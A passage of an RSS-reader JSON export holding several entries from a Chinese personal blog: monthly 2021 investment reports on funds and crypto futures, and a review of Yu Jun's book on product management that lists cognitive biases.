月份价格调整的结束，看着彩虹模型图的走势，继续期待接下来几个月的 BTC 走势。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/04/30/investment2104/",
          "creator": "",
          "pubDate": "2021-05-01T14:20:52.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/04/30/investment2104/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "a0bab0332a97521c883f3590fefd2f3b",
          "highlights": []
        },
        {
          "title": "2021年3月投资月报：稳是王道",
          "description": "\n    \n      <blockquote>\n<p>流水不争先，争的是滔滔不绝。</p>\n</blockquote>\n<p>老子的《道德经》道出了水的本质。人在面对欲望或是爆发的好运时，该如何自处？水的特性即是答案：流水不争先，争的是滔滔不绝。</p>\n<p>投资/投机中也是一样的道理，当好运到来时\n    \n    ",
          "content": "<blockquote>\n<p>流水不争先，争的是滔滔不绝。</p>\n</blockquote>\n<p>老子的《道德经》道出了水的本质。人在面对欲望或是爆发的好运时，该如何自处？水的特性即是答案：流水不争先，争的是滔滔不绝。</p>\n<p>投资/投机中也是一样的道理，当好运到来时，可能会让你的资产迅速上升但却不可持续，如果你沉迷于一时的好运却没有及时将运气转化为落袋为安的利润，那财富也是转瞬即逝。</p>\n<p>本月开始使用净值法进行账户收益统计，一方面净值法会更加准确，另一方面因为账户频繁的转入转出资金会导致收益率没办法计算。</p>\n<p><a href=\"https://youzhiyouxing.cn/\" target=\"_blank\" rel=\"noopener\">有知有行 App</a> 在资产统计模块做的还算不错，我把手头的几个账户进行了重新梳理，将投资记录进行了录入，才形成了现在更好的净值统计方法。</p>\n<h2 id=\"期货收益统计\"><a href=\"#期货收益统计\" class=\"headerlink\" title=\"期货收益统计\"></a>期货收益统计</h2><p>截止到当日 19:00，『区块创新』账户净值为 <code>1.5426</code>，上月净值为 <code>1.3227</code>，本月净值增长 <code>0.2199</code>。</p>\n<p>『期货搏一搏』账户净值为 <code>12.0924</code>，上月净值为 <code>10.2529</code>，本月净值增长 <code>1.8395</code>。</p>\n<p>其中区块创新账户因为中途加了杠杆，净值一度飙升至 <code>2.2117</code>，可惜没有及时的进行对冲操作，导致账户回撤，所幸月底还算有所盈利，真的是验证了那句话：稳才是王道。</p>\n<p><img src=\"/blogimg/20210331001.JPEG\" alt=\"20210331001\"></p>\n<p align=\"center\">↑ 期货账户</p>\n\n<h2 id=\"网格收益统计\"><a href=\"#网格收益统计\" class=\"headerlink\" title=\"网格收益统计\"></a>网格收益统计</h2><p>『Pionex网格』账户本月净值为 <code>1.2926</code>，因为该账户是上月底才进行创建的，所以本月净值增长 <code>0.2926</code>。</p>\n<p><img src=\"/blogimg/20210331003.jpg\" alt=\"20210331003\"></p>\n<p align=\"center\">↑ Pionex网格</p>\n\n<h2 id=\"基金收益统计\"><a href=\"#基金收益统计\" class=\"headerlink\" title=\"基金收益统计\"></a>基金收益统计</h2><p>基金账户『基金长盈』以今年初为初始状态，截止到今天账户有所回撤，目前净值 <code>0.9797</code>。</p>\n<p>基金账户『跑赢大盘』为春节后进行投资的账户，因为年后股市的频频下跌，导致目前该账户净值为 <code>0.8826</code>，整体回撤在可控范围之内，目前也在不定期对该账户进行资金追加。</p>\n<p><img src=\"/blogimg/20210331002.JPEG\" alt=\"20210331002\"></p>\n<p align=\"center\">↑ 基金账户</p>\n\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>截止到目前为止，不管是美股、港股、A股，还是债券、股票打新、基金等，这些传统的投资品都没有办法跑赢数字货币，数字货币特指为比特币。</p>\n<p>目前个人主要精力也是集中在数字货币现货、期货、期现套利等相关投资/投机品的操作之中，逐步修炼属于自己的投资体系。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/03/31/investment2103/",
          "creator": "",
          "pubDate": "2021-03-31T12:32:26.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/03/31/investment2103/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "1ed44a2c9a13779a154ee799bfee266a",
          "highlights": []
        },
        {
          "title": "2021年2月投资月报：经历过山车行情",
          "description": "\n    \n      <blockquote>\n<p>交易你的计划，计划你的交易</p>\n</blockquote>\n<p>2 月份的股市走势可以用过山车来形容，上半场大家一起跑向高点，下半场大家一起关灯吃面，大家一起玩了一个寂寞。对于在上半场高位进场的人来讲，应该已经开始亏损本金或者回撤去年的利润了\n    \n    ",
          "content": "<blockquote>\n<p>交易你的计划，计划你的交易</p>\n</blockquote>\n<p>2 月份的股市走势可以用过山车来形容，上半场大家一起跑向高点，下半场大家一起关灯吃面，大家一起玩了一个寂寞。对于在上半场高位进场的人来讲，应该已经开始亏损本金或者回撤去年的利润了。</p>\n<p><img src=\"/blogimg/20210228001.png\" alt=\"20210228001\"></p>\n<p align=\"center\">↑ 沪深 300 近一个月走势</p>\n\n<p>受大盘影响，我的基金账户也是坐了一个过山车，截止到今天的 20:30 分，今年收益 <code>+0.37%</code>，1 月底的收益为 <code>+0.25%</code>，所以本月收益率 <code>+0.12%</code>。</p>\n<p><img src=\"/blogimg/20210228004.jpg\" alt=\"20210228004.jpg\"></p>\n<p align=\"center\">↑ 基金收益</p>\n\n<p>数字货币本月行情也是经历了一场过山车，月初一直到 2 月 22 号行情都在一直上涨，账户也都创了新高，随后的一周时间市场开始回调，因为没有及时的进行落袋为安，账户回撤严重。</p>\n<p>截止到今天，账户 A 整体收益率 <code>+147.65%</code>，本月收益 <code>+97.34%</code>。</p>\n<p>本月因为有知有行 App 上线了记账功能，所以使用 App 进行手动记账了，并对账户资金进行了重新修正，后续的记账功能以此为准并进行收益率计算。</p>\n<p><img src=\"/blogimg/20210228002.jpg\" alt=\"20210228002.jpg\"></p>\n<p align=\"center\">↑ 期货账户A</p>\n\n<p>账户 B 本月操作激进并遭遇暴跌，所以收益较上月有所回撤，不过本月进行了提现操作，本月提现了 <code>+555.88%</code> 的收益，所以下跌以后资金回撤自己内心心态也比较安稳了。</p>\n<p>截止到 1 月底该账户收益率为 <code>+1158.24%</code>，2 月底该账户总体收益率为 <code>+1175%</code>，本月收益仅 <code>+16.76%</code>。</p>\n<p><img src=\"/blogimg/20210228003.jpg\" alt=\"20210228003.jpg\"></p>\n<p align=\"center\">↑ 期货账户B</p>\n\n<h3 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h3><p>不管是高频还是低频交易，不管是杠杆还是普通交易，设置止盈止损很重要。本月期货账户浮盈其实已经达到了阶段目标，但是因为没有进行止盈操作，反而在大跌时账户回撤严重。不过还好整体而言账户收益还是正的，后续要努力把收益率提升上去。</p>\n<p>就像那句话说的：交易你的计划，计划你的交易。希望自己接下来的交易会更加稳定和持续的盈利。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/02/28/investment2102/",
          "creator": "",
          "pubDate": "2021-02-28T13:24:52.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/02/28/investment2102/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "c63daadcee43f44855db348c366e59be",
          "highlights": []
        },
        {
          "title": "2021年1月投资月报：投资还是投机？",
          "description": "\n    \n      <h2 id=\"投资还是投机？\"><a href=\"#投资还是投机？\" class=\"headerlink\" title=\"投资还是投机？\"></a>投资还是投机？</h2><p>王福重老师前几天在微博问了一个问题很有意思：『投资和投机的区别是什么？』当然底下的评论也是很有趣。<\n    \n    ",
          "content": "<h2 id=\"投资还是投机？\"><a href=\"#投资还是投机？\" class=\"headerlink\" title=\"投资还是投机？\"></a>投资还是投机？</h2><p>王福重老师前几天在微博问了一个问题很有意思：『投资和投机的区别是什么？』当然底下的评论也是很有趣。</p>\n<blockquote>\n<p>『挣到钱是投机，没挣到是投资。』<br>『投资是明媒正娶，投机是暗通款曲。』<br>『投机也是投资的一种，属于是一种风险大，收益较高的投资。』</p>\n</blockquote>\n<p><img src=\"/blogimg/2021013101.jpg\" alt=\"2021013101.jpg\"></p>\n<p align=\"center\">↑ 王福重老师微博</p>\n\n<p>随后发生了一件事引起了国内投资者很大的关注，那就是美国散户 WSB 大战华尔街机构，简单来说就是美国的散户买股票不看基本面和估值，疯狂买入 GameStop 的股票从而导致 GME 暴涨，而这一次的暴涨导致美国几家大的对冲基金损失惨重，因为机构在做空 GME。</p>\n<p>这次事件可以说在中美都迅速成为热门话题，专业媒体、自媒体铺天盖地的讲这件事，感兴趣的朋友可以 Google 一下相关的帖子和视频。</p>\n<p>最后机构和交易所因为损失惨重，也对散户做了很多对策，比如拔网线、限制交易等。大部分普通人理解的投资可能属于专业的投资机构，而投机的是散户，面对这次散户vs华尔街机构事件，加上机构种种的非法操作，不知道大家又该如何理解投资和投机。</p>\n<p><img src=\"/blogimg/2021013102.jpg\" alt=\"2021013102.jpg\"></p>\n<p align=\"center\">↑ 推特用户对 2021 年 01 月几个重要事件的总结</p>\n\n<h2 id=\"基金收益\"><a href=\"#基金收益\" class=\"headerlink\" title=\"基金收益\"></a>基金收益</h2><p>01 月基金收益率 <code>+0.25%</code></p>\n<p>本月基金收益整体不太好，一方面因为基金仓位太少，最近在不断加仓；另一方面也是因为本月尤其是后半月的行情走势不是太好，所以整体收益率跑输大盘。因为基金账户多为定投，所以继续定投 + 下跌加仓。</p>\n<p><img src=\"/blogimg/2021013103.jpg\" alt=\"2021013103.jpg\"></p>\n<p align=\"center\">↑ 本月基金收益率</p>\n\n<h2 id=\"期货收益\"><a href=\"#期货收益\" class=\"headerlink\" title=\"期货收益\"></a>期货收益</h2><p>期货账户 A 较月初的收益率为：<code>-15.39%</code>，账户总收益率为：<code>+50.31%</code><br>期货账户 B 较月初的收益率为：<code>+184.44%</code>，账户总收益率为：<code>+1158.24%</code></p>\n<p><img src=\"/blogimg/2021013104.jpg\" alt=\"2021013104.jpg\"></p>\n<p align=\"center\">↑ 期货实盘收益率，因为开通时间问题，收益率和实际有所偏差</p>\n\n<p>实盘为了更直观的了解账户收益情况，因为和交易账户时间有误差，所以收益率和账户实际收益率有所偏差。</p>\n<h3 id=\"账户-A-的操作\"><a href=\"#账户-A-的操作\" class=\"headerlink\" title=\"账户 A 的操作\"></a>账户 A 的操作</h3><p>期货账户 A 全部为 BTC，主要寻求稳健收益，所以整体杠杆率很低，每月操作仅有几次。</p>\n<p>操作的次数少也就意味着会错失很多机会，尤其是很多短线机会，当然面对行情剧烈波动时也会更安心一些，找到合适的时间和位置介入，其他时间耐心等待。</p>\n<h3 id=\"账户-B-的操作\"><a href=\"#账户-B-的操作\" class=\"headerlink\" title=\"账户 B 的操作\"></a>账户 B 的操作</h3><p>期货账户 B 资产为 ETH，前期投入较少，所以操作也会更加激进一些，激进操作就会导致账户的整体操作次数变多，当然做错的次数也会变多。</p>\n<p>目前的收益主要为 ETH 在月初的主升浪，一波上涨带来了很大的涨幅。当然还有部分收益来自于前几天的 Doge 狗狗币。因为 WSB 事件，国外这些散户又把方向标准了数字货币市场的 Doge 狗狗币，在狗狗币上涨前期，我看到推特上的信息并进行了确认，而且当时看到推特社群活跃人数很多，每个人都很亢奋。</p>\n<p>所以我卖出了部分 ETH 买入了 Doge 现货，1 天多的时间 Doge 狗狗币爆拉近 10 倍，我吃到了部分的涨幅，但因为错误的操作了合约导致利润回撤严重，最终历时 2 天成功退出，收益率约为 <code>+351.56%</code>，经历了过山车一样的行情，加上合约的错误操作，对自己的这次投机收益还算满意。</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>期货市场本月基金为震荡为主，但是自己没有很好的进行风险对冲，导致账户较月初回撤严重，1 月份中也有很多次的操作机会，但因为种种原因要么没有操作，要么操作以后只吃到了很小的一部分收益。</p>\n<p>所以还是需要修炼自己，不仅仅是行情的判断，还有思维、行动力的提升，当然风险管理也很重要。市场永远不缺乏机会，接下来的时间继续努力。</p>\n<p>分享我关注的一个博主：<a href=\"https://twitter.com/LoneCapital\" target=\"_blank\" rel=\"noopener\">LEI</a> 对于股票投资的一些方法，希望也对你有用。</p>\n<p><img src=\"/blogimg/2021013105.jpeg\" alt=\"2021013105.jpeg\"></p>\n<p align=\"center\">↑ LEI 的推特内容</p>\n\n\n\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/01/31/investment2101/",
          "creator": "",
          "pubDate": "2021-01-31T14:11:46.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/01/31/investment2101/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "4f18b7a4177e2e5905ad5b65abecf840",
          "highlights": []
        },
        {
          "title": "Read.002《俞军产品方法论》产品经理的高级进阶",
          "description": "\n    \n      <p>高阶产品经理是什么样的？他们又是怎么样在用户体验、公司业务等各方面进行利益平衡的呢？带着这样的好奇我读了这本书，当然一方面也是冲着俞军的大名来的。</p>\n<p><img src=\"/blogimg/20210123001.jpeg\" alt=\"20210123001\"><\n    \n    ",
          "content": "<p>高阶产品经理是什么样的？他们又是怎么样在用户体验、公司业务等各方面进行利益平衡的呢？带着这样的好奇我读了这本书，当然一方面也是冲着俞军的大名来的。</p>\n<p><img src=\"/blogimg/20210123001.jpeg\" alt=\"20210123001\"></p>\n<p align=\"center\">↑ 《俞军产品方法论》</p>\n\n<h2 id=\"最初的产品经理\"><a href=\"#最初的产品经理\" class=\"headerlink\" title=\"最初的产品经理\"></a>最初的产品经理</h2><p>产品经理岗位最初来源于宝洁，在以宝洁为代表的消费品时代，产品经理的侧重点都在销售上面。因为需求相对确定，生产也很标准化，有工业时代成熟的方法论来支撑，使得产品本身容易同质化，但在品牌定位、营销、渠道控制上的差别，决定公司是可以挣10亿元还是100亿元。因此，宝洁时代的产品经理，在销售和营销方向创造的价值更大。</p>\n<p>进入软件时代，产品经理的主要工作是管理软件生产。早年软件的设计大多数是to B的，to B的需求相对容易明确，根据客户的需求进行迭代即可。即使有一些to C（面向个人）的产品，也因为市场稀缺性的缘故，用户选择较少，产品不愁卖。那个时代最稀缺的是生产软件的合格工程师，供给远远跟不上需求。所以产品经理在管理生产上更能创造价值：沟通协调，版本控制，按时交付。因此，软件时代的产品经理，在协调和生产上创造的价值更大。</p>\n<p>随着互联网信息分发效率和数据可反馈性的提升，让互联网产品经理对产品本身可以进行快速的迭代，也需要产品经理具有快速迭代的能力。而随着流程和工具的普及，使产品工作在一定范围和程度上被科学化、标准化了。标准化能降低门槛，也进一步降低了产品经理的入行门槛，不但降低了对产品经理所拥有的经验和技术的要求，甚至降低了对其理解用户能力的要求。</p>\n<p>这也是目前互联网行业产品经理比较多的原因，因为做技术研发的岗位可以转产品经理、测试也可以转产品经理，市场上就有了太多的互联网产品经理。</p>\n<h2 id=\"产品经理做什么\"><a href=\"#产品经理做什么\" class=\"headerlink\" title=\"产品经理做什么\"></a>产品经理做什么</h2><blockquote>\n<p>产品经理如果要学习成熟学科的话，最主要的是学习经济学和心理学。经济学就是讲在约束条件下追求利益最大化。一般来说，不仅企业是这样，用户也是这样，每个用户都是在自利地追求价值最大化。</p>\n</blockquote>\n<p>产品是由人加工，有用户，且可以被交易的商品或服务。因此，产品要经过“需求”“生产”“销售”三个环节。产品经理要对产品的市场结果负责，需要对这三个环节分别进行关注，并“协调”公司不同分工下的不同职能，让大家共同完成目标。</p>\n<p>在此俞军提出了对产品经理一个很重要的模型：交易模型。</p>\n<p>这要求产品经理除了掌握用户模型，还能理解一个领域各利益方的价值判断和行为习惯，以及产品实现过程中的各种干扰因素，这样才能自如地设计和优化交易模型。这里是把所有产品看作交易，搜索、社交、阅读等信息类产品只是货币价格为零的特殊交易。研究交易模型，除了理解产业链上各方的价值判断和复杂关系，主要研究的就是交易费用。</p>\n<p>我们认为，一个好产品要有三个属性：（对用户）有效用，（企业）有收益，可持续。只有可持续，才能让企业长期赚钱；只有可持续，才能长期为用户创造更多价值。而可持续就涉及交易模型设计问题。只有产业链上各方在创造价值和利益分配方面公平合理，有竞争性，产品才可持续。</p>\n<h3 id=\"理解用户\"><a href=\"#理解用户\" class=\"headerlink\" title=\"理解用户\"></a>理解用户</h3><p>从产品经理的视角来看，用户不是自然人，而是需求的集合。</p>\n<p>如何理解用户是需求的集合？由于不同产品满足用户不同场景下的需求，当某个产品完全满足了某个用户在某个场景下的某类需求，那么就可以说此用户是该产品的一个用户。举个例子，如果某个用户一个月有100次使用专车的需求，100次全用了滴滴专车，那么我们可以说此用户是滴滴专车的一位用户；如果100次专车需求中，只有50次使用了滴滴专车，那么这个用户就只有一半是属于滴滴的，滴滴其实只获得了半个用户。</p>\n<p><code>用户价值 =新体验–旧体验– 替换成本</code></p>\n<p>从这个维度，提升用户价值有三种方式：让新体验最大化，让旧体验最小化，降低替换成本，三者互相影响。要让用户价值最大化，必须综合权衡三者，总是在当前约束条件下进行资源最优配置。</p>\n<h3 id=\"理解产品\"><a href=\"#理解产品\" class=\"headerlink\" title=\"理解产品\"></a>理解产品</h3><p>卖产品是卖一种在约束条件下的效用组合。分析产品的重点是弄明白这个产品利从何来、利往何去，它创造了什么价值，价值是怎么分配的。从价值的维度分析，才能推演它的趋势，才能理解用户的需求，而不是只从表面上看它有没有某种功能，是不是又改版了。如果它增加一个功能，那为什么要增加，这种做法也可能是错的，这些永远要自己去判断。</p>\n<p>以创造用户价值为目的，打破一个旧的利益平衡，建立一个对己方有利的新产业链，这样的产品才容易成功。这种情况是要做一个规模较大的产品，也有很多领域是可以很多产品并存的。但互联网时代和软件时代、消费品时代完全不一样，平台型的大规模产品非常常见。</p>\n<p>一个好产品应该有三个属性：有效用，有利润，可持续。有效用当然是指对用户有使用价值，有利润是指产品必须让企业获利（可以是间接的），然后在“可持续”这个属性上达到用户利益和商业利益的统一。可持续其实是靠实践验证的，即追求长期利益最大化。</p>\n<h3 id=\"理解企业\"><a href=\"#理解企业\" class=\"headerlink\" title=\"理解企业\"></a>理解企业</h3><p>产品经理的用户，首先是企业。产品经理与企业交换价值，所以需要先理解企业。</p>\n<p>总体上，企业的本质，只在于两点：第一，发现市场获利机会；第二，生产效率高于市场。</p>\n<h2 id=\"交易与交易模型\"><a href=\"#交易与交易模型\" class=\"headerlink\" title=\"交易与交易模型\"></a>交易与交易模型</h2><p>产品通过交易转移到了一个更能创造价值的人手里，樵夫拿到斧子和音乐家拿到小提琴，他们就能创造比之前要大得多的价值。他们利用这两个物品创造新价值的能力也增加了，也就是说，这个世界上的总物质没有增加，但这个世界上的人类创造新价值的能力增加了。</p>\n<p>这就是这个世界无时无刻不在发生交易的原因——交易创造价值。</p>\n<p>世界上没有等价交换，只要不存在强迫和欺诈，一定是双方都主观判断自己会受益，才会完成交易。如果有一方亏本，他就不会愿意进行交易。产品即交易，作为产品经理，就要帮助用户创造这样的交换，产品设计要以终为始，一开始就奔着最后能成交去设计。</p>\n<p>所以，一个企业的核心最终目标就应该是创造交易，有交易才有用户，才算完成了价值创造，才有可能赚钱。发现市场机会，其实就是发现你能促成一个交易，让用户付出某种代价来买你的产品。这种代价可能是金钱，也可能是时间，或者是体力、精力、精神等。</p>\n<p>你愿意放弃已获得的某个东西，大概率是为了换取当下对你而言更高的用户价值。交换创造价值，反过来也可以理解为，不创造当下主观价值的交换不可能存在。</p>\n<p>所以也可以从这个角度去思考产品经理这个角色。产品经理用产品促成企业和用户间的价值交换，每一次交换都会创造价值。产品经理最终要做的，是持续不断地发现市场上高于用户支付代价的用户价值，并设计合适的交易模型把它固化为产品。</p>\n<p>劳动、分工、新技术、制度和交易都是创造价值的一些手段。交易和交换本质上是一回事，我们从上帝视角来看，双方都是在交易或者交换。但是从单方视角来看，交易的任何一方都只关心“我会付出什么，我会得到什么”。只有得到的大于付出的，他才愿意参与交换，否则他就不会执行这个交换行为（理性人还能做到根据机会成本做决策）。</p>\n<p>企业以产品为媒介，创造用户价值并和用户交换。企业的一切行为也应该围绕“让交换行为更多地发生”。以下是让更多的交换行为发生的具体做法。</p>\n<p>（1）持续发现和追加可交换的、有利可图的用户价值。<br>（2）创造和更高效率地创造这些用户价值。<br>（3）持续降低生产成本和所有交易成本。<br>（4）企业行为的权重，按影响用户交换行为的ROI排序。<br>（5）维护企业生存能力和可持续发展能力。</p>\n<p>除此以外，产品经理还要关注产品的效用、边际、成本、供需关系和相对价格等知识。</p>\n<h2 id=\"理性决策\"><a href=\"#理性决策\" class=\"headerlink\" title=\"理性决策\"></a>理性决策</h2><p>产品经理是做权衡的，不是做“设计”或“创意”的。或者说，我们中的很多人可能对“设计”存在误解。广义的设计，是对整个系统加以改变。无论什么领域，建筑、消费品、在线服务，设计都是要放在系统背景下考虑的。如果把“设计”狭义地定义成好创意、自我表达、好审美等等，其实是只选择去满足一小部分用户的诉求，只能在小众市场成功。而互联网产品做大后都是平台，就不适合运用创意思维和设计师思维了，需要适当引入经济学思维，习惯于权衡取舍，追求整个系统的效率。当然，也会有著名的现象级产品宣称自己遵从这类狭义设计理念，一般来说那可能是因为产品遇到了一轮巨大的新要素红利，本身已创造了巨大用户价值，其他因素的影响权重都降低，随便怎么做都锦上添花。在这种情况下，好的审美或交互当然有市场价值，但它们其实不会左右产品的成功与否。若产品本身已成功，创始人或管理者无论怎么解释，不论他是真这么想还是为了营销，历史也不能重演，第三方也就无法证伪。</p>\n<p>行为科学研究得出结论，一个人一天的行为中大约有5%是非习惯性的，而其他95%的行为都源自习惯。这基本上意味着是习惯而不是逻辑，决定了我们的一生。我们以为自己是理性的，我们以为自己的一举一动都是讲逻辑、有道理的。但事实上，我们的多数日常行为，都是一些我们自己根本无法了解的隐蔽动机导致的结果。所谓理性，是指当条件合适时（理性并非总是优于本能和习惯），优先用逻辑、知识和思维去做出决策和预期收益最大化的行为，而不是任由本能和习惯驱使。</p>\n<p>逻辑决策也是“讲理决策”，结论靠逻辑推导得来。但需要对方具备相应的认知水平，否则就会鸡同鸭讲。想让一个人理解和接受一个道理，是要在他的偏好和认知结构内去实现的。如果对方不具备相应的偏好和认知结构，就需要帮他补齐，但这个成本实在太高了。所以，逻辑决策的成本远高于数据决策。</p>\n<h3 id=\"决策的误区\"><a href=\"#决策的误区\" class=\"headerlink\" title=\"决策的误区\"></a>决策的误区</h3><p>产品经理作为研究人的职业，关于认知偏误的知识是其必修课，既要极力避免自己犯这些错，也要从这些角度理解人性，理解一些用户行为背后的原理。维基百科词条“认知偏误列表”列举了近两百种认知偏误，下面这些是产品经理需要关注的。</p>\n<h4 id=\"1、归因偏误\"><a href=\"#1、归因偏误\" class=\"headerlink\" title=\"1、归因偏误\"></a>1、归因偏误</h4><p>一些常见的归因偏误现象如下。</p>\n<p>自利偏误：将成功归因于自己，而将失败归因于环境。把集体行动的结果归因于自己，多过其他人会归因的程度。</p>\n<p>正面效应与负面效应：评价喜欢的人的行为时，把他们做好事归因于内在本质，而把他们做坏事归因于环境因素。评价不喜欢的人的行为时，把他们做好事归因于环境因素，而把他们做坏事归因于内在本质。</p>\n<p>群体归因偏误：把个体的特质当作其所属群体的特质，或把个体的行为当作其所属群体的偏好。</p>\n<p>终极归因偏误：把问题归因于整个群体，而非群体中的个体。</p>\n<p>基本归因偏误：解释他人行为时，过度归因于内在特质（一定是他有这样的人格，才做出这样的行为），而非外在情境（也许是情势所迫，或这个场所有特殊的潜规则）。</p>\n<h4 id=\"2、锚定效应\"><a href=\"#2、锚定效应\" class=\"headerlink\" title=\"2、锚定效应\"></a>2、锚定效应</h4><p>锚定效应是指为不熟悉的事物估值时，会把熟悉的类似事物或不久前接触到的无关数值当作“锚”，估出来的数值会大大倾向“锚”。类似的偏误现象还有以下几种。</p>\n<p>幸存者偏差：过度关注在某些经历后幸存下来的人事物，忽略那些没有幸存的（沉默的数据），造成结论偏离实际情况。</p>\n<p>峰终定律：我们对一项事物进行体验之后，印象最深的是在峰值与结束时的体验，而在过程中好与不好体验的比重、好与不好体验的时间长短，对记忆影响很小。高峰之后，终点出现得越迅速，这件事留给我们的印象越深刻。</p>\n<p>框架效应：同一资讯以不同方式呈现会使得人的想法不同，例如告知公众有一个做法将会“导致三分之一的人死亡”和“保护三分之二的人活下来”的效果是不一样的。</p>\n<p>禀赋效应：指人们拥有或即将拥有某物品或资产时，对其价值的评估会比没有时高出许多，因而不愿失去或放弃它。</p>\n<p>心理账户：人们将消费分门别类（住宅、食物、服装、娱乐、投资等），且每一个类别对应各自的心理账户，每个心理账户都有自己的预算和单独的参照点，使得各个账户之间的替代性非常有限。一个人对给定数量金钱赋予的价值，取决于这部分钱属于哪一个心理账户，继而依赖于背景、框架和情境。心理账户能解释同一个人在不同事物上的花钱矛盾现象。</p>\n<p>损失厌恶：指人们面对同样数量的收益和损失时，认为损失更加令人难以忍受。损失带来的负效用约为同量收益的正效用的2.5倍。损失厌恶反映了人们的风险偏好并不客观，当涉及的是收益时，人们表现为风险厌恶；当涉及的是损失时，人们则表现为风险寻求。</p>\n<h4 id=\"3、选择性注意\"><a href=\"#3、选择性注意\" class=\"headerlink\" title=\"3、选择性注意\"></a>3、选择性注意</h4><p>人们常常倾向于忽略掉不符合自己期望的东西，只看到自己期望看到的东西，他们期望看到的东西又是基于熟悉的东西、先前的经历，或是个人的欲望、兴趣需求，这就是选择性注意。</p>\n<h4 id=\"4、刻板印象\"><a href=\"#4、刻板印象\" class=\"headerlink\" title=\"4、刻板印象\"></a>4、刻板印象</h4><p>刻板印象是指对某人或某一类人产生的一种比较固定的、类化的看法。人们习惯把人进行机械的归类，把某个具体的人看作某类人的典型代表，把对某类人的评价视为对某个人的评价。典型现象如种族歧视、地域歧视、职业歧视、性别歧视等。</p>\n<h4 id=\"5、自我中心偏误\"><a href=\"#5、自我中心偏误\" class=\"headerlink\" title=\"5、自我中心偏误\"></a>5、自我中心偏误</h4><p>自我美化偏误：会美化回忆中的自己，往往认为自己比实际情况更好。例如记忆中自己的考试成绩比实际更好。</p>\n<p>支持选择偏误：回顾自己做过的选择时，倾向认为它是明智的，给出高于实际的评价。如购买后把之前的购买决定合理化，即使买下的商品太过昂贵或有瑕疵。</p>\n<p>错误共识效应：高估别人对自己的认同程度，认为所有人以同一方式思考。</p>\n<p>投射偏误：不自觉地以为他人（或未来的自己）和（现在的）自己有相似的情感、思想与价值观。</p>\n<p>素朴实在论：相信自己所见所闻即是真相，是客观且不带偏见的，认为这是显而易见的事实。</p>\n<p>控制错觉：高估自己对外在事件的影响力，认为事情是受自己控制或影响的，但实际上它可能与自己毫无关系。</p>\n<p>达克效应：能力过差的人由于无法分辨能力好与能力差的不同，因而会错误地高估自己的真实水准，有一种虚幻的自我优越感。</p>\n<p>逆火效应：遇上与自身信念抵触的观点或证据时，除非它们足以完全摧毁原信念，否则会忽略或反驳它们，原信念反而更加强化。</p>\n<p>证实偏见：人们普遍偏向能够验证己方假设和观点的信息，而不是那些否定假设的信息。关注、寻找、诠释、记忆信息的方向多半是能证实自己假设和成见的方向，而那些可能推翻自己观点的信息往往会被忽视掉。</p>\n<p>舒适区效应：对于过去常用的方案，高估效益或成功机会；对于过去少用的方案，低估效益或成功机会。</p>\n<h4 id=\"6、信念偏误\"><a href=\"#6、信念偏误\" class=\"headerlink\" title=\"6、信念偏误\"></a>6、信念偏误</h4><p>可得性偏误：对容易想到的事，会高估其发生概率。然而一件事是否容易想到还受发生多久、激起情绪的程度等因素影响，无法反映实际的发生概率。</p>\n<p>频率错觉：因最近注意到一件原先没注意到的事，就觉得这件事到处都在发生。</p>\n<p>后见之明偏误：又称“我早就知道了”“马后炮”“事后诸葛亮”。在事情发生或发展后，以为自己事前就能预测其发生与发展。</p>\n<p>可获性层叠：一件事越常被公开谈论，人们就越相信其正确性，类似“三人成虎”。货币错觉：专注于货币名目上（表面上）的价值，而非其实质购买力。</p>\n<p>一致性偏误：记忆中他人过去的态度与行为会变得像目前的态度与行为。</p>\n<p>巴纳姆效应：人们会把他们认为是为自己量身定做的人格描述评价为高度准确，而这些描述往往十分模糊及普遍，能放诸四海而皆准，适用于很多人。这个效应多出现于占卜星相、算命和个体性格分析等情境。</p>\n<p>基本比率忽视：只关注针对性的信息，忽略一般性的信息（基本比率），导致不恰当的认知。例如因为酒驾较容易肇事，就认为肇事者中很多是酒驾，然而由于酒驾者占所有驾驶者的比例很小，肇事者中酒驾者的比例不会那么高。</p>\n<p>赌徒谬误：认为某事多次发生则未来发生的概率较小，或多次未发生则未来发生的概率较大。就像赌徒认为掷骰子时连续几把结果是“大”，那么下一把是“小”的概率更高，而忽视了每一次掷骰子都是独立事件，有独立概率。</p>\n<p>逆赌徒谬误：认为发生概率很小的事不会发生，如果发生了，一定是做了很多次。</p>\n<h4 id=\"7、决策类偏误\"><a href=\"#7、决策类偏误\" class=\"headerlink\" 